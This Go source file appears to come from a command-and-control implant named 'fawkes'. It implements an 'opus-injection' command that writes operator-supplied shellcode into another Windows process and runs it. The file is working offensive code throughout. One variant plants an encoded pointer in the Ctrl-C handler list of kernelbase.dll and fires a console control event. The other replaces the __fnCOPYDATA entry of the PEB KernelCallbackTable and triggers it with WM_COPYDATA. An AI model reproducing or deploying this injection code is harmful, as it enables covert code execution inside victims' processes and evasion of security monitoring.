//go:build windows
// +build windows

// Package commands provides the opus-injection command for novel callback-based process injection.
//
// Opus Injection explores Windows callback mechanisms that haven't been commonly weaponized.
// These techniques manipulate function pointer structures to achieve code execution through
// legitimate Windows API triggers.
//
// Currently supported variants:
//   - Variant 1: Ctrl-C Handler Chain Injection (console processes)
//   - Variant 4: PEB KernelCallbackTable Injection (GUI processes)
//
// Future variants planned:
//   - Variant 2: WNF (Windows Notification Facility) Callback Injection
//   - Variant 3: FLS (Fiber Local Storage) Callback Injection
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// Opus-specific constants
const (
	// Console control events
	CTRL_C_EVENT        = 0
	CTRL_BREAK_EVENT    = 1
	CTRL_CLOSE_EVENT    = 2
	CTRL_LOGOFF_EVENT   = 5
	CTRL_SHUTDOWN_EVENT = 6
)

// Handler list offsets in kernelbase.dll (Windows 10/11)
// These were determined through reversing with WinDbg
const (
	// RVA offsets from kernelbase.dll base
	HandlerListRVA                = 0x399490 // Pointer to heap-allocated array of encoded handler pointers
	HandlerListLengthRVA          = 0x39CBB0 // DWORD: current number of handlers
	AllocatedHandlerListLengthRVA = 0x39CBB4 // DWORD: allocated array capacity
)

// ProcessCookie info class for NtQueryInformationProcess
const ProcessCookie = 36

// ProcessBasicInformation info class
const ProcessBasicInformation = 0

// Window message constants
const (
	WM_COPYDATA = 0x004A
)

// PEB offset for KernelCallbackTable (x64)
const PEBKernelCallbackTableOffset = 0x58

// COPYDATASTRUCT for WM_COPYDATA
type COPYDATASTRUCT struct {
	DwData uintptr
	CbData uint32
	LpData uintptr
}

// PROCESS_BASIC_INFORMATION for NtQueryInformationProcess
type PROCESS_BASIC_INFORMATION struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr
	Reserved2       [2]uintptr
	UniqueProcessId uintptr
	Reserved3       uintptr
}

var (
	ntdllOpus                       = windows.NewLazySystemDLL("ntdll.dll")
	user32Opus                      = windows.NewLazySystemDLL("user32.dll")
	procAttachConsole               = kernel32.NewProc("AttachConsole")
	procFreeConsole                 = kernel32.NewProc("FreeConsole")
	procAllocConsole                = kernel32.NewProc("AllocConsole")
	procGenerateConsoleCtrlEvent    = kernel32.NewProc("GenerateConsoleCtrlEvent")
	procNtQueryInformationProcessOp = ntdllOpus.NewProc("NtQueryInformationProcess")
	procFindWindowA                 = user32Opus.NewProc("FindWindowA")
	procFindWindowExA               = user32Opus.NewProc("FindWindowExA")
	procGetWindowTextA              = user32Opus.NewProc("GetWindowTextA")
	procGetWindowThreadProcessId    = user32Opus.NewProc("GetWindowThreadProcessId")
	procSendMessageA                = user32Opus.NewProc("SendMessageA")
)


// OpusInjectionCommand implements the opus-injection command
type OpusInjectionCommand struct{}

// Name returns the command name
func (c *OpusInjectionCommand) Name() string {
	return "opus-injection"
}

// Description returns the command description
func (c *OpusInjectionCommand) Description() string {
	return "Perform novel callback-based process injection using unexplored Windows mechanisms"
}

// OpusInjectionParams represents the parameters for opus-injection
type OpusInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
	Variant      int    `json:"variant"`
}

// Execute executes the opus-injection command
func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	var params OpusInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No shellcode data provided",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: Invalid PID specified",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: Shellcode data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	var output string
	switch params.Variant {
	case 1:
		output, err = executeOpusVariant1(shellcode, uint32(params.PID))
	case 4:
		output, err = executeOpusVariant4(shellcode, uint32(params.PID))
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: Unsupported variant %d. Currently supported: 1 (Ctrl-C Handler), 4 (KernelCallbackTable)", params.Variant),
			Status:    "error",
			Completed: true,
		}
	}

	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("\n[!] Injection failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

// executeOpusVariant1 implements Ctrl-C Handler Chain Injection
func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] Opus Injection Variant 1: Ctrl-C Handler Chain Injection\n"
	output += "[*] Target: Console processes only\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Find kernelbase.dll in target process
	kernelbaseAddr, err := findModuleInProcess(hProcess, "kernelbase.dll")
	if err != nil {
		return output, fmt.Errorf("failed to find kernelbase.dll: %v", err)
	}
	output += fmt.Sprintf("[+] Found kernelbase.dll at: 0x%X\n", kernelbaseAddr)

	// Step 3: Calculate addresses using known RVA offsets
	handlerListPtrAddr := kernelbaseAddr + HandlerListRVA
	handlerListLengthAddr := kernelbaseAddr + HandlerListLengthRVA
	allocatedLengthAddr := kernelbaseAddr + AllocatedHandlerListLengthRVA

	output += fmt.Sprintf("[+] HandlerList pointer at: 0x%X\n", handlerListPtrAddr)

	// Step 4: Read current handler array pointer
	var handlerArrayAddr uintptr
	err = readProcessMemoryPtr(hProcess, handlerListPtrAddr, &handlerArrayAddr)
	if err != nil {
		return output, fmt.Errorf("failed to read HandlerList pointer: %v", err)
	}
	output += fmt.Sprintf("[+] Handler array at: 0x%X\n", handlerArrayAddr)

	// Step 5: Read current handler count and capacity
	var handlerCount uint32
	var allocatedCount uint32
	err = readProcessMemoryDword(hProcess, handlerListLengthAddr, &handlerCount)
	if err != nil {
		return output, fmt.Errorf("failed to read HandlerListLength: %v", err)
	}
	err = readProcessMemoryDword(hProcess, allocatedLengthAddr, &allocatedCount)
	if err != nil {
		return output, fmt.Errorf("failed to read AllocatedHandlerListLength: %v", err)
	}
	output += fmt.Sprintf("[+] Current handlers: %d, Capacity: %d\n", handlerCount, allocatedCount)

	if handlerCount >= allocatedCount {
		return output, fmt.Errorf("handler array is full (%d/%d) - cannot inject without reallocation", handlerCount, allocatedCount)
	}

	// Step 6: Get process cookie via NtQueryInformationProcess(ProcessCookie)
	// The cookie is a 32-bit DWORD value
	pointerCookie, err := getProcessCookie(hProcess)
	if err != nil {
		return output, fmt.Errorf("failed to get process cookie: %v", err)
	}
	output += fmt.Sprintf("[+] Process cookie: 0x%X\n", pointerCookie)

	// Step 8: Allocate memory for shellcode
	// Use kernel32 proc calls (defined in vanillainjection.go)
	shellcodeAddr, _, allocErr := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", allocErr)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 9: Write shellcode
	var bytesWritten uintptr
	ret, _, writeErr := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", writeErr)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 10: Encode shellcode address using the target's pointer cookie
	// RtlEncodePointer: (pointer XOR cookie) ROR (cookie & 0x3F)
	encodedShellcodeAddr := encodePointer(shellcodeAddr, pointerCookie)
	output += fmt.Sprintf("[+] Encoded shellcode address: 0x%X\n", encodedShellcodeAddr)

	// Step 11: Write encoded pointer to handler array at index [handlerCount]
	targetSlot := handlerArrayAddr + uintptr(handlerCount)*8
	err = writeProcessMemoryPtr(hProcess, targetSlot, encodedShellcodeAddr)
	if err != nil {
		return output, fmt.Errorf("failed to write handler to array: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote encoded handler to slot %d (0x%X)\n", handlerCount, targetSlot)

	// Step 12: Increment HandlerListLength
	newCount := handlerCount + 1
	err = writeProcessMemoryDword(hProcess, handlerListLengthAddr, newCount)
	if err != nil {
		return output, fmt.Errorf("failed to update HandlerListLength: %v", err)
	}
	output += fmt.Sprintf("[+] Updated HandlerListLength: %d -> %d\n", handlerCount, newCount)

	// Step 13: Detach from our console (if any) and attach to target
	// Save whether we had a console originally
	procFreeConsole.Call()

	ret, _, attachErr := procAttachConsole.Call(uintptr(pid))
	if ret == 0 {
		// Try to restore original handler count before failing
		writeProcessMemoryDword(hProcess, handlerListLengthAddr, handlerCount)
		// Try to restore our console
		procAllocConsole.Call()
		return output, fmt.Errorf("AttachConsole failed: %v (target may not be a console process)", attachErr)
	}
	output += "[+] Attached to target console\n"

	// Step 14: Generate Ctrl+C event
	// Use process group 0 to send to all processes on the CURRENT console
	// Since we're now attached to the target's console, this sends to the target!
	ret, _, ctrlErr := procGenerateConsoleCtrlEvent.Call(
		uintptr(CTRL_C_EVENT),
		0, // 0 = all processes on current console (which is now the target's)
	)
	if ret == 0 {
		output += fmt.Sprintf("[!] GenerateConsoleCtrlEvent failed: %v\n", ctrlErr)
		output += "[*] Handler installed but auto-trigger failed.\n"
		output += "[*] MANUAL TRIGGER: Press Ctrl+C in the target console window to execute shellcode.\n"
	} else {
		output += "[+] Generated CTRL_C_EVENT to target console\n"
	}

	// Detach from target console and restore our own
	procFreeConsole.Call()
	procAllocConsole.Call()

	output += "[+] Opus Injection Variant 1 completed\n"
	output += fmt.Sprintf("[*] Handler installed at slot %d. Shellcode will execute on Ctrl+C.\n", handlerCount)

	return output, nil
}

// executeOpusVariant4 implements PEB KernelCallbackTable Injection
func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] Opus Injection Variant 4: PEB KernelCallbackTable Injection\n"
	output += "[*] Target: GUI processes only (requires user32.dll)\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Query PEB address via NtQueryInformationProcess
	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32

	status, _, _ := procNtQueryInformationProcessOp.Call(
		uintptr(hProcess),
		uintptr(ProcessBasicInformation),
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if status != 0 {
		return output, fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
	}

	output += fmt.Sprintf("[+] Target PEB address: 0x%X\n", pbi.PebBaseAddress)

	// Step 3: Read KernelCallbackTable pointer from PEB+0x58
	kernelCallbackTablePtrAddr := pbi.PebBaseAddress + PEBKernelCallbackTableOffset
	var kernelCallbackTable uintptr
	err = readProcessMemoryPtr(hProcess, kernelCallbackTablePtrAddr, &kernelCallbackTable)
	if err != nil {
		return output, fmt.Errorf("failed to read KernelCallbackTable pointer: %v", err)
	}

	output += fmt.Sprintf("[+] Original KernelCallbackTable: 0x%X\n", kernelCallbackTable)

	if kernelCallbackTable == 0 {
		return output, fmt.Errorf("KernelCallbackTable is NULL - target may not be a GUI process")
	}

	// Step 4: Read original callback table (256 entries to be safe)
	const tableSize = 256 * 8 // 256 pointers * 8 bytes each
	originalTable := make([]byte, tableSize)
	var bytesRead uintptr
	err = windows.ReadProcessMemory(hProcess, kernelCallbackTable, &originalTable[0], tableSize, &bytesRead)
	if err != nil {
		return output, fmt.Errorf("failed to read KernelCallbackTable: %v", err)
	}

	output += fmt.Sprintf("[+] Read original callback table (%d bytes)\n", bytesRead)

	// Get __fnCOPYDATA pointer (index 0)
	fnCopyDataOriginal := *(*uintptr)(unsafe.Pointer(&originalTable[0]))
	output += fmt.Sprintf("[+] __fnCOPYDATA (index 0): 0x%X\n", fnCopyDataOriginal)

	// Step 5: Allocate RWX memory for shellcode
	shellcodeAddr, _, allocErr := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", allocErr)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 6: Write shellcode
	var bytesWritten uintptr
	ret, _, writeErr := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", writeErr)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 7: Create modified callback table
	modifiedTable := make([]byte, tableSize)
	copy(modifiedTable, originalTable)

	// Replace __fnCOPYDATA (index 0) with shellcode address
	*(*uintptr)(unsafe.Pointer(&modifiedTable[0])) = shellcodeAddr
	output += fmt.Sprintf("[+] Modified __fnCOPYDATA entry: 0x%X -> 0x%X\n", fnCopyDataOriginal, shellcodeAddr)

	// Step 8: Allocate memory for modified table
	remoteTableAddr, _, allocErr2 := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(tableSize),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if remoteTableAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for table failed: %v", allocErr2)
	}
	output += fmt.Sprintf("[+] Allocated remote callback table at: 0x%X\n", remoteTableAddr)

	// Step 9: Write modified table
	ret, _, writeErr2 := procWriteProcessMemory.Call(
		uintptr(hProcess),
		remoteTableAddr,
		uintptr(unsafe.Pointer(&modifiedTable[0])),
		uintptr(tableSize),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for table failed: %v", writeErr2)
	}
	output += fmt.Sprintf("[+] Wrote modified callback table (%d bytes)\n", bytesWritten)

	// Step 10: Update PEB+0x58 to point to modified table
	err = writeProcessMemoryPtr(hProcess, kernelCallbackTablePtrAddr, remoteTableAddr)
	if err != nil {
		return output, fmt.Errorf("failed to update PEB KernelCallbackTable pointer: %v", err)
	}
	output += fmt.Sprintf("[+] Updated PEB+0x58: 0x%X -> 0x%X\n", kernelCallbackTable, remoteTableAddr)

	// Step 11: Find window by PID
	hwnd, err := findWindowByPID(pid)
	if err != nil {
		// Try to restore before failing
		writeProcessMemoryPtr(hProcess, kernelCallbackTablePtrAddr, kernelCallbackTable)
		return output, fmt.Errorf("failed to find window for PID %d: %v", pid, err)
	}
	output += fmt.Sprintf("[+] Found target window: 0x%X\n", hwnd)

	// Step 12: Trigger execution via WM_COPYDATA
	output += "\n[*] Triggering shellcode via WM_COPYDATA...\n"

	// Build COPYDATASTRUCT
	data := []byte("test")
	cds := COPYDATASTRUCT{
		DwData: 1,
		CbData: uint32(len(data)),
		LpData: uintptr(unsafe.Pointer(&data[0])),
	}

	// Send WM_COPYDATA
	result, _, _ := procSendMessageA.Call(
		uintptr(hwnd),
		uintptr(WM_COPYDATA),
		uintptr(hwnd),
		uintptr(unsafe.Pointer(&cds)),
	)

	output += fmt.Sprintf("[+] SendMessage returned: %d\n", result)
	output += "[+] Shellcode should have executed!\n"

	// Wait briefly for execution
	windows.Sleep(1000)

	// Step 13: Restore original KernelCallbackTable pointer
	err = writeProcessMemoryPtr(hProcess, kernelCallbackTablePtrAddr, kernelCallbackTable)
	if err != nil {
		output += fmt.Sprintf("[!] Warning: Failed to restore original KernelCallbackTable pointer: %v\n", err)
	} else {
		output += "[+] Restored original KernelCallbackTable pointer\n"
	}

	output += "[+] Opus Injection Variant 4 completed\n"

	return output, nil
}

// findWindowByPID finds a window handle for a given process ID
func findWindowByPID(targetPID uint32) (uintptr, error) {
	var foundHwnd uintptr
	var currentHwnd uintptr

	// Enumerate all top-level windows
	for {
		ret, _, _ := procFindWindowExA.Call(
			0,                    // hWndParent (desktop)
			currentHwnd,          // hWndChildAfter (previous window)
			0,                    // lpClassName (any)
			0,                    // lpWindowName (any)
		)

		if ret == 0 {
			break // No more windows
		}

		currentHwnd = ret

		// Get window's process ID
		var windowPID uint32
		procGetWindowThreadProcessId.Call(
			currentHwnd,
			uintptr(unsafe.Pointer(&windowPID)),
		)

		if windowPID == targetPID {
			foundHwnd = currentHwnd
			break
		}
	}

	if foundHwnd == 0 {
		return 0, fmt.Errorf("no window found for PID %d", targetPID)
	}

	return foundHwnd, nil
}

// findModuleInProcess finds a module's base address in a remote process
func findModuleInProcess(hProcess windows.Handle, moduleName string) (uintptr, error) {
	// Use EnumProcessModulesEx to find the module
	var modules [1024]windows.Handle
	var needed uint32

	err := windows.EnumProcessModulesEx(hProcess, &modules[0], uint32(len(modules)*int(unsafe.Sizeof(modules[0]))), &needed, windows.LIST_MODULES_ALL)
	if err != nil {
		return 0, err
	}

	numModules := needed / uint32(unsafe.Sizeof(modules[0]))

	for i := uint32(0); i < numModules; i++ {
		var modName [windows.MAX_PATH]uint16
		err := windows.GetModuleBaseName(hProcess, modules[i], &modName[0], windows.MAX_PATH)
		if err != nil {
			continue
		}

		name := windows.UTF16ToString(modName[:])
		if stringsEqualFold(name, moduleName) {
			return uintptr(modules[i]), nil
		}
	}

	return 0, fmt.Errorf("module %s not found", moduleName)
}

// stringsEqualFold compares strings case-insensitively
func stringsEqualFold(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := 0; i < len(a); i++ {
		ca, cb := a[i], b[i]
		if ca >= 'A' && ca <= 'Z' {
			ca += 32
		}
		if cb >= 'A' && cb <= 'Z' {
			cb += 32
		}
		if ca != cb {
			return false
		}
	}
	return true
}

// getProcessCookie retrieves the process cookie via NtQueryInformationProcess(ProcessCookie)
func getProcessCookie(hProcess windows.Handle) (uint32, error) {
	var cookie uint32
	var returnLength uint32

	status, _, _ := procNtQueryInformationProcessOp.Call(
		uintptr(hProcess),
		uintptr(ProcessCookie), // Info class 36
		uintptr(unsafe.Pointer(&cookie)),
		uintptr(4), // DWORD size
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if status != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess(ProcessCookie) failed: 0x%X", status)
	}

	return cookie, nil
}

// encodePointer implements RtlEncodePointer algorithm
// Encoding: (pointer XOR cookie) ROR (cookie & 0x3F)
func encodePointer(ptr uintptr, cookie uint32) uintptr {
	// XOR with cookie (zero-extended to 64-bit)
	result := ptr ^ uintptr(cookie)

	// Rotate right by (cookie & 0x3F) bits
	rotateAmount := cookie & 0x3F
	if rotateAmount > 0 {
		result = (result >> rotateAmount) | (result << (64 - rotateAmount))
	}

	return result
}

// readProcessMemoryPtr reads a pointer-sized value from remote process
func readProcessMemoryPtr(hProcess windows.Handle, addr uintptr, value *uintptr) error {
	var bytesRead uintptr
	buf := make([]byte, 8)
	err := windows.ReadProcessMemory(hProcess, addr, &buf[0], 8, &bytesRead)
	if err != nil {
		return err
	}
	*value = *(*uintptr)(unsafe.Pointer(&buf[0]))
	return nil
}

// readProcessMemoryDword reads a DWORD value from remote process
func readProcessMemoryDword(hProcess windows.Handle, addr uintptr, value *uint32) error {
	var bytesRead uintptr
	buf := make([]byte, 4)
	err := windows.ReadProcessMemory(hProcess, addr, &buf[0], 4, &bytesRead)
	if err != nil {
		return err
	}
	*value = *(*uint32)(unsafe.Pointer(&buf[0]))
	return nil
}

// writeProcessMemoryPtr writes a pointer-sized value to remote process
func writeProcessMemoryPtr(hProcess windows.Handle, addr uintptr, value uintptr) error {
	var bytesWritten uintptr
	buf := (*[8]byte)(unsafe.Pointer(&value))[:]
	return windows.WriteProcessMemory(hProcess, addr, &buf[0], 8, &bytesWritten)
}

// writeProcessMemoryDword writes a DWORD value to remote process
func writeProcessMemoryDword(hProcess windows.Handle, addr uintptr, value uint32) error {
	var bytesWritten uintptr
	buf := (*[4]byte)(unsafe.Pointer(&value))[:]
	return windows.WriteProcessMemory(hProcess, addr, &buf[0], 4, &bytesWritten)
}
